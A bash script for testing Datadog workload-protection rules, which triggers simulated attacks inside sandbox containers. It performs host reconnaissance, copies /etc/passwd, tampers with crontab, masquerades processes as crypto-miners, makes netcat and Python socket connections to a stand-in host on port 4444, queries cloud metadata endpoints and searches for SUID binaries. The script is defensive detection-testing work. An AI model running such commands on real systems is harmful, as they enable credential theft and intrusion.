#!/usr/bin/env bash
# CWS Detection Trigger Script
#
# PURPOSE: Simulates malicious patterns INSIDE CONTAINERS to test Datadog
# Workload Protection (CWS) detection rules. These are harmless simulations
# that generate detectable signals without causing real damage.
#
# WARNING: Only run inside sandbox containers, not on your host machine.
# Some patterns (e.g., DNS lookups to mining pools) may be flagged by
# corporate network monitoring even when originating from containers.
#
# Usage:
#   docker compose exec python-app bash /app/cws/trigger-detections.sh
#
# Each function triggers a specific CWS rule category.
# Run individual functions or "all" to trigger everything.

set -euo pipefail

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

log() { echo -e "${GREEN}[CWS]${NC} $1"; }
warn() { echo -e "${YELLOW}[CWS]${NC} $1"; }

# 1. Suspicious process execution
trigger_suspicious_process() {
    log "Triggering: Suspicious process execution"

    # Reconnaissance commands (often flagged by CWS)
    whoami 2>/dev/null || true
    id 2>/dev/null || true
    uname -a 2>/dev/null || true
    cat /etc/os-release 2>/dev/null || true

    # Network reconnaissance
    which curl 2>/dev/null && curl -s -o /dev/null http://ifconfig.me 2>/dev/null || true

    # Process listing (common in container escape attempts)
    ps aux 2>/dev/null || true

    log "Done: Suspicious process execution"
}

# 2. File integrity monitoring (FIM)
trigger_fim() {
    log "Triggering: File integrity monitoring"

    # Write to sensitive paths
    cp /etc/passwd /tmp/passwd_backup 2>/dev/null || true
    echo "# test modification" >> /tmp/passwd_backup 2>/dev/null || true

    # Attempt to modify crontab
    echo "* * * * * echo test" > /tmp/test_cron 2>/dev/null || true
    crontab /tmp/test_cron 2>/dev/null || true
    rm -f /tmp/test_cron 2>/dev/null || true
    crontab -r 2>/dev/null || true

    # Modify SSH config (if exists)
    if [ -d /etc/ssh ]; then
        touch /etc/ssh/test_config 2>/dev/null || true
        rm -f /etc/ssh/test_config 2>/dev/null || true
    fi

    rm -f /tmp/passwd_backup 2>/dev/null || true
    log "Done: File integrity monitoring"
}

# 3. Crypto-miner-like behavior
trigger_crypto_patterns() {
    log "Triggering: Crypto-miner patterns"

    # DNS queries to mining pools (will fail but generates the signal)
    nslookup pool.minexmr.com 2>/dev/null || true
    nslookup xmr.pool.minergate.com 2>/dev/null || true

    # Process names that look like miners
    bash -c 'exec -a xmrig sleep 1' 2>/dev/null || true
    bash -c 'exec -a cpuminer sleep 1' 2>/dev/null || true

    log "Done: Crypto-miner patterns"
}

# 4. Reverse shell patterns
trigger_reverse_shell() {
    log "Triggering: Reverse shell patterns (harmless)"

    # These will fail to connect but CWS detects the attempt
    bash -c 'echo "test" | nc -w 1 192.0.2.1 4444 2>/dev/null' || true

    # Python reverse shell attempt (won't actually connect)
    python3 -c "
import socket
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1)
    s.connect(('192.0.2.1', 4444))
except:
    pass
finally:
    s.close()
" 2>/dev/null || true

    log "Done: Reverse shell patterns"
}

# 5. Container metadata access
trigger_metadata_access() {
    log "Triggering: Cloud metadata endpoint access"

    # AWS metadata
    curl -s -m 2 http://169.254.169.254/latest/meta-data/ 2>/dev/null || true

    # GCP metadata
    curl -s -m 2 -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/ 2>/dev/null || true

    # Azure metadata
    curl -s -m 2 -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null || true

    log "Done: Cloud metadata access"
}

# 6. Privilege escalation attempts
trigger_privesc() {
    log "Triggering: Privilege escalation patterns"

    # Sudo attempts
    sudo -l 2>/dev/null || true
    sudo id 2>/dev/null || true

    # SUID binary search
    find / -perm -4000 -type f 2>/dev/null | head -5 || true

    # Capability checks
    which capsh 2>/dev/null && capsh --print 2>/dev/null || true

    log "Done: Privilege escalation patterns"
}

# Main
case "${1:-all}" in
    process)   trigger_suspicious_process ;;
    fim)       trigger_fim ;;
    crypto)    trigger_crypto_patterns ;;
    shell)     trigger_reverse_shell ;;
    metadata)  trigger_metadata_access ;;
    privesc)   trigger_privesc ;;
    all)
        trigger_suspicious_process
        sleep 1
        trigger_fim
        sleep 1
        trigger_crypto_patterns
        sleep 1
        trigger_reverse_shell
        sleep 1
        trigger_metadata_access
        sleep 1
        trigger_privesc
        echo ""
        log "All CWS triggers executed. Check Datadog > Security > Workload Security for signals."
        ;;
    *)
        echo "Usage: $0 {all|process|fim|crypto|shell|metadata|privesc}"
        exit 1
        ;;
esac
